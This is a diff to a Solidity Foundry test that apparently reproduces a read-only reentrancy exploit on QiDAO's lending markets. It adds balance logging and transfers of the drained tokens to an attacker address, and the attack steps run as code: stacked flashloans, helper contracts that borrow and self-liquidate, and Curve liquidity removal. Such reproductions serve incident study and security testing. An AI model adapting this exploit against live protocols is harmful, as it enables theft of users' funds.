@@ -5,10 +5,13 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../../TestHarness.sol";
 
 import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";
+import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
 
 import "./QiAttack.interfaces.sol";
 
-contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
+contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan, TokenBalanceTracker {
+    address attackerExternalAddress = 0x4206d62305d2815494dcdb759c4E32FCA1D181a0;
+
     IAaveFlashloan aave = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
     address aWMaticProxy = 0x8dF3aad3a84da6b69A4DA8aeC3eA40d9091B2Ac4;
 
@@ -63,6 +66,12 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         cheat.label(address(QIDAO_DELEGATOR), "QiDAO Delegator");
 
         cheat.deal(address(this), 0);
+
+        addTokenToTracker(address(WMATIC));
+        addTokenToTracker(address(stLIDOMATIC));
+        addTokenToTracker(address(QI_MIMATIC));
+
+        updateBalanceTracker(address(this));
     }
 
     function test_attack() external {
@@ -71,6 +80,9 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
 
     // Same signature as attacker's
     function run() public {
+        console.log("\n===== 0. INITIAL BALANCES ======");
+        logBalancesWithLabel('Attacker Contract', address(this));
+
         console.log("\n===== 1. REQUEST FLASHLOAN ON AAVE ======");
         address[] memory _tokens = new address[](1);
         _tokens[0] = address(WMATIC);
@@ -82,6 +94,11 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         _arg3[0] = 0;
 
         aave.flashLoan(address(this), _tokens, _amounts, _arg3, address(this), "", 0);
+        logBalancesWithLabel('Attacker Contract', address(this));
+
+        WMATIC.transfer(attackerExternalAddress, WMATIC.balanceOf(address(this)));
+        stLIDOMATIC.transfer(attackerExternalAddress, stLIDOMATIC.balanceOf(address(this)));
+        QI_MIMATIC.transfer(attackerExternalAddress, QI_MIMATIC.balanceOf(address(this)));
     }
 
     function executeOperation(
@@ -90,13 +107,14 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         uint256[] memory _fees,
         address _requester,
         bytes memory /*_data*/
-    ) external returns(bool) {
+    ) external returns (bool) {
         require(_requester == address(this), "Flashloan not requested");
         require(msg.sender == address(aave), "Not called by Aave");
         require(address(WMATIC) == _tokens[0], "Wrong tokens requested");
 
-        console.log("\n===== 2. REQUEST FLASHLOAN ON BALANCER ======");
+        logBalancesWithLabel('Attacker Contract', address(this));
 
+        console.log("\n===== 2. REQUEST FLASHLOAN ON BALANCER ======");
         address[] memory _tokensBalancer = new address[](2);
         _tokensBalancer[0] = address(WMATIC);
         _tokensBalancer[1] = address(stLIDOMATIC);
@@ -111,7 +129,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
 
         console.log("\n===== 18. Approve Aave for Repayment =====");
         WMATIC.approve(address(aave), _amounts[0] + _fees[0]);
-        
+
         return true;
     }
 
@@ -126,63 +144,86 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan {
         require(address(tokens[1]) == address(stLIDOMATIC));
 
         console.log("\n===== 3. HANDLE BALANCER FLASHLOAN ======");
+        logBalancesWithLabel('Attacker Contract', address(this));
 
         console.log("\n===== 4. Deploy and fund Minion One =====");
         uint256 _borrowAmt = QI_MIMATIC.balanceOf(address(QIDAO_DELEGATOR)) * 1000 / 1004;
-        console.log(_borrowAmt);
         minionOne = new Attacker_Minion_One(address(this), 90000000000000000000000, _borrowAmt); // (commander, depositAmt, borrowAmt)
+        updateBalanceTracker(address(minionOne));
 
         WMATIC.transfer(address(minionOne), WMATIC.balanceOf(address(this)));
         stLIDOMATIC.transfer(address(minionOne), stLIDOMATIC.balanceOf(address(this)));
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Minion One (Borrower)', address(minionOne));
 
         console.log("\n===== 5. Minion One begins its operations =====");
         minionOne.borrow();
+        logBalancesWithLabel('\nMinion One (Borrower)', address(minionOne));
+        logBalancesWithLabel('\nAttacker Contract', address(this));
 
         console.log("\n===== 6. Deploy Minion Two =====");
         minionTwo = new Attacker_Minion_Two(address(this));
+        updateBalanceTracker(address(minionTwo));
 
         console.log("\n===== 7. Minion Two liquidates Minion One =====");
         uint256 attackAmt = QI_MIMATIC.balanceOf(address(this)) * 265 / 1000;
         QI_MIMATIC.transfer(address(minionTwo), attackAmt);
         minionTwo.liquidate(address(minionOne), QI_MIMATIC, QIDAO_DELEGATOR, STMATIC_MATIC_DELEGATOR, attackAmt);
+        logBalancesWithLabel('\nMinion One (Borrower)', address(minionOne));
+        logBalancesWithLabel('\nAttacker Contract', address(this));
 
         console.log("\n===== 8. Commander Withdraws all from Beefy and Removes Liqudity =====");
         BEEFY_STMATIC.withdrawAll();
         uint256[2] memory minAmounts = [uint256(0), uint256(0)];
         CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)), minAmounts, true);
+        logBalancesWithLabel('Attacker Contract', address(this));
 
         console.log("\n===== 10. Commander Exchanges Matic for WMATIC =====");
         WMATIC.deposit{value: address(this).balance}();
+        logBalancesWithLabel('Attacker Contract', address(this));
 
         console.log("\n===== 11. Deploy and fund Minion Three =====");
         _borrowAmt = QI_MIMATIC.balanceOf(address(QIDAO_DELEGATOR)) * 1000 / 1004;
         minionThree = new Attacker_Minion_One(address(this), 25000000000000000000000, _borrowAmt); // (commander, depositAmt, borrowAmt)
+        updateBalanceTracker(address(minionThree));
 
         WMATIC.transfer(address(minionThree), WMATIC.balanceOf(address(this)));
         stLIDOMATIC.transfer(address(minionThree), stLIDOMATIC.balanceOf(address(this)));
 
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Minion Three (Borrower)', address(minionThree));
+
         console.log("\n===== 12. Minion Three begins its operations =====");
         minionThree.borrow();
+        logBalancesWithLabel('\nMinion Three (Borrower)', address(minionThree));
+        logBalancesWithLabel('\nAttacker Contract', address(this));
 
         console.log("\n===== 13. Minion Two liquidates Minion One =====");
         attackAmt = QI_MIMATIC.balanceOf(address(this)) * 6 / 100;
         QI_MIMATIC.transfer(address(minionTwo), attackAmt);
         minionTwo.liquidate(address(minionThree), QI_MIMATIC, QIDAO_DELEGATOR, STMATIC_MATIC_DELEGATOR, attackAmt);
+        logBalancesWithLabel('\nMinion Three (Borrower)', address(minionThree));
+        logBalancesWithLabel('\nAttacker Contract', address(this));
 
         console.log("\n===== 14. Commander Withdraws all from Beefy and Removes Liqudity =====");
         BEEFY_STMATIC.withdrawAll();
         CURVE_STMATIC_POOL.remove_liquidity(CURVE_STMATIC_LP_TOKEN.balanceOf(address(this)), minAmounts, true);
+        logBalancesWithLabel('Attacker Contract', address(this));
 
         console.log("\n===== 15. Swap and Exchange =====");
         _swap();
         _exchange();
 
+        logBalancesWithLabel('Attacker Contract', address(this));
+
         console.log("\n===== 16. Deposit WMATIC =====");
         WMATIC.deposit{value: address(this).balance}();
+        logBalancesWithLabel('Attacker Contract', address(this));
 
         console.log("\n===== 17. Repay Balancer =====");
         WMATIC.transfer(address(balancer), amounts[0]);
         stLIDOMATIC.transfer(address(balancer), amounts[1]);
+        logBalancesWithLabel('Attacker Contract', address(this));
     }
 
     receive() external payable {}
@@ -333,4 +374,3 @@ contract Attacker_Minion_Two {
         _underlying.transfer(ATTACKER_COMMANDER, _underlying.balanceOf(address(this)));
     }
 }
-      //   minionTwo.liquidate(address(minionOne), QI_MIMATIC, QIDAO_DELEGATOR, STMATIC_MATIC_DELEGATOR, attackAmt);
